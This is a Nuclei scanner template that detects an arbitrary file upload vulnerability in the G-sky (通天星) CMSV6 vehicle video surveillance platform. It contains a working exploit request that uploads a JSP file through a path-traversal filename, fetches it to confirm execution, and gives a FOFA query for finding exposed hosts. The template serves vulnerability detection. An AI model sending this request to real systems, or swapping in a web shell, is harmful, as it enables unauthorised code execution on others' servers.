id: gsky-cmsv6-inspectfile-fileupload
info:
  name: 通天星 CMSV6 车载视频监控平台 inspect_file upload - fileupload
  author: leadlife
  severity: critical
  description: 通天星-CMSV6-inspect_file-upload存在任意文件上传漏洞
  reference: 
    - https://github.com/wy876/POC/blob/main/%E9%80%9A%E5%A4%A9%E6%98%9F-CMSV6-inspect_file-upload%E5%AD%98%E5%9C%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E.md
  metadata:
    verified: true
    max-request: 1
    fofa-query: body="./open/webApi.html"||body="/808gps/"
  tags: g-sky,fileupload


http:
  - raw:
      - |
        POST /inspect_file/upload HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1)
        Accept-Encoding: gzip, deflate
        Accept: */*
        Connection: close
        Content-Length: 226
        Content-Type: multipart/form-data; boundary=2e7688d712bcc913201f327059f9976b

        --2e7688d712bcc913201f327059f9976b
        Content-Disposition: form-data; name="uploadFile"; filename="../707140.jsp"
        Content-Type: application/octet-stream

        <% out.println("007319607"); %>
        --2e7688d712bcc913201f327059f9976b--

      - |
        GET {{upload-name}} HTTP/1.1
        Host: {{Hostname}}


    matchers:
      - type: dsl
        dsl:
          - "status_code_1 == 200 && status_code_2 == 200"
          - "contains_all(body_1,'resMap')"
          - "contains(body_2,'007319607')"
        condition: and


    extractors: 
      - type: json
        part: body
        internal: true
        name: upload-name
        json:
          - ".data.filePath"